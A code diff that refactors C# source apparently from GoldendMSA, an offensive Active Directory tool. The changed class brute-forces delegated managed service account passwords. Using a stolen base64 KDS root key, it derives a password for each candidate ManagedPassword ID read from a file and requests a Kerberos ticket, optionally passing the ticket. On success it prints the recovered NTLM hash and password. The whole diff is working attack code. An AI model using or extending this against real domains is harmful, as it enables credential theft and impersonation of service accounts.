@@ -4,71 +4,57 @@ using System.Security.Principal;
 
 namespace GoldendMSA
 {
-    public class BruteForceDMSA
+    public static class BruteForceDmsa
     {
-        public static void BruteForce(SecurityIdentifier sid, String Base64KDS, String fileName, String username, String DomainName, bool ptt=false, bool verbose=false) {
-            (string dcFqdn, string dcIp) = LdapUtils.GetDomainControllerInfoAlt(DomainName);
-            if (!String.IsNullOrEmpty(dcIp))
-            {
-                BruteForceByFile(sid, Base64KDS, fileName, username, dcIp, DomainName, ptt,verbose);
-            }
+        public static void BruteForce(SecurityIdentifier sid, string base64Kds, string fileName, string username,
+            string domainName, bool ptt = false, bool verbose = false)
+        {
+            var (dcFqdn, dcIp) = LdapUtils.GetDomainControllerInfoAlt(domainName);
+            if (!string.IsNullOrEmpty(dcIp))
+                BruteForceByFile(sid, base64Kds, fileName, username, dcIp, domainName, ptt, verbose);
             else
-            {
                 Console.WriteLine("Faced issues when trying to resolve the DC's IP.");
-            }
         }
-        public static void BruteForceByFile(SecurityIdentifier sid, String Base64KDS, String fileName, String username, String DCIp, String DomainName, bool ptt, bool verbose)
+
+        private static void BruteForceByFile(SecurityIdentifier sid, string base64Kds, string fileName, string username,
+            string dcIp, string domainName, bool ptt, bool verbose)
         {
             try
             {
-                string[] lines = File.ReadAllLines(fileName);
+                var lines = File.ReadAllLines(fileName);
 
-                for (int i = 0; i < lines.Length; i++)
-                {
-                    lines[i] = lines[i].Trim();
-                }
+                for (var i = 0; i < lines.Length; i++) lines[i] = lines[i].Trim();
 
-                for (int i = 0; i < lines.Length; i++)
+                for (var i = 0; i < lines.Length; i++)
                 {
-                    string line = lines[i];
+                    var line = lines[i];
 
                     if (string.IsNullOrEmpty(line))
                         continue;
 
                     line = line.Trim();
-                    Base64KDS = Base64KDS.Trim();
-                    string managedPasswordID = Program.ProcessComputePwdOptions(sid, Base64KDS, line, null, null, false);
-                    byte[] decodedData = Convert.FromBase64String(managedPasswordID);
-                    string ntlmHash = Helpers.ConvertBase64ToNTLM(managedPasswordID);
+                    base64Kds = base64Kds.Trim();
+                    var managedPasswordId = Program.ProcessComputePwdOptions(sid, base64Kds, line, null, null, false);
+                    // var decodedData = Convert.FromBase64String(managedPasswordID);
+                    var ntlmHash = Helpers.ConvertBase64ToNtlm(managedPasswordId);
                     if (verbose)
-                    {
-                        Console.WriteLine("Action: Ask TGT (attempt #" + i + ") for " + DomainName + "\\" + username);
-                    }
-                    if(Helpers.base64ToAES(username, DomainName, managedPasswordID, true, ptt, verbose) == 1)
+                        Console.WriteLine(
+                            "[>] Action: Ask TGT (attempt #" + i + ") for " + domainName + "\\" + username);
+                    if (Helpers.Base64ToAes(username, domainName, managedPasswordId, true, ptt, verbose) == 1)
                     {
                         Console.WriteLine($"NTLM Hash:\t{ntlmHash}");
                         Console.WriteLine();
                         Console.WriteLine("ManagedPassword-ID:\t" + line);
                         Console.WriteLine();
-                        Console.WriteLine("Base64 Encoded Password:\t" + managedPasswordID);
-                        Console.WriteLine();
+                        Console.WriteLine("Base64 Encoded Password:\t" + managedPasswordId);
                         break;
-
                     }
                 }
             }
             catch (Exception ex)
             {
-                if (verbose)
-                {
-                    Console.WriteLine($"Error: {ex.Message}");
-                }
+                if (verbose) Console.WriteLine($"Error: {ex.Message}");
             }
         }
-        
-
     }
-
-    
-
 }
